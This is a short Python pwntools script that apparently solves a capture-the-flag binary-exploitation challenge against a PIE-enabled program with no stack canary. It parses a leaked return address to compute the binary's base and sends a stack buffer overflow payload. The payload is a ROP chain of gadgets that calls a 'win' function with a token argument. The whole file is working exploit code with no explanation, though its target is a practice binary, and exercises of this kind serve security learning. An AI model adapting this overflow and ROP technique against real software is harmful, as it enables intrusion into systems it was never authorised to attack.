from pwn import *

'''
[*] '/challenge/binary-exploitation-pie-overflow-w'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
main_offset = 0x2a92
ret_to_main = 0x2b18
pop_rdi_gadjet = 0x2b83
token = 0x1337
ret_gadjet = 0x101a
win_ofset = 0x239f
r = process('/challenge/binary-exploitation-pie-overflow-w')


save_address = r.recvline_contains('rsp+0x0068').decode().split('|')[3]
save_address = int(save_address, 16)
base_address = save_address - ret_to_main
print('ret to main ' + str(ret_to_main) + '  save addr ' + str(save_address))
print('base  = '   + str(base_address))
ret_gadjet += base_address
pop_rdi_gadjet  += base_address
win_ofset += base_address
offset = 0x40 + 8
payload = b'A' * offset +  p64(pop_rdi_gadjet) + p64(token) + p64(ret_gadjet) + p64(win_ofset)

r.send(payload)
r.interactive()
